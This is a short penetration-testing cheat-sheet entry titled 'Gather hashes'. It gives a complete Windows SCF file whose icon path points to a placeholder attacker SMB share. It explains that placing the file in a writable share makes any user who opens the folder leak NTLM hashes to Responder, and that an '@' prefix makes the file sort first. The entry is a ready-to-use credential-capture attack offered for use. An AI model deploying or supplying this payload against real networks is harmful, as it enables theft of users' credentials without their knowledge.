# Gather hashes
```scf
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```


Put this file as test.scf in any writeable share and when user open the share you will get hit in responder. You can add @ to the file like @test.scf and the file will apear first in share.